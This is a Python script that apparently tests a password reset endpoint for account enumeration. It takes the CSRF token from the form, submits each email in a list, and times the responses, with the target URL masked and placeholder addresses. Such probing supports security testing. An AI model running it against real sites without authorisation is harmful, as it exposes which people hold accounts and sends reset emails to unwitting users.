import requests
import re
import time
import sys

# Put whatever e-mails you wish to use for actual testing on that array
emails = [
    "someone@email.com",
    "someone@email.com",
    "someone@email.com",
    "someone@email.com",
]

url = "https://XXXXXXXXXX/password_reset/"

def reset_password(email):
    with requests.Session() as s:
        # GET the form (not timed, because it's just token harvesting)
        get_resp = s.get(url)
        if get_resp.status_code != 200:
            print(f"[!] GET failed for {email}: {get_resp.status_code}")
            return None

        # Extract CSRF token
        match = re.search(r'name="csrfmiddlewaretoken"\s+value="([^"]+)"', get_resp.text)
        if not match:
            print(f"[!] No token found for {email}")
            return None
        token = match.group(1)

        payload = {
            "email": email,
            "csrfmiddlewaretoken": token,
        }

        # ---- TIMED POST ----
        start = time.perf_counter()
        post_resp = s.post(url, data=payload)
        elapsed = (time.perf_counter() - start) * 1000  # milliseconds
        # --------------------

        return {
            "email": email,
            "status": post_resp.status_code,
            "elapsed_ms": round(elapsed, 2),
            "content_len": len(post_resp.text),
            "text_sample": post_resp.text[:200],  # first 200 chars, for quick manual check
        }

for email in emails:
    result = reset_password(email)
    if result:
        print(f"[*] {result['email']} | HTTP {result['status']} | {result['elapsed_ms']} ms | size: {result['content_len']} bytes")
        # Uncomment next line to see the start of the response body
        # print(f"    Body preview: {result['text_sample']}")
    else:
        print(f"[-] Failed for {email}")
    time.sleep(6)   # delay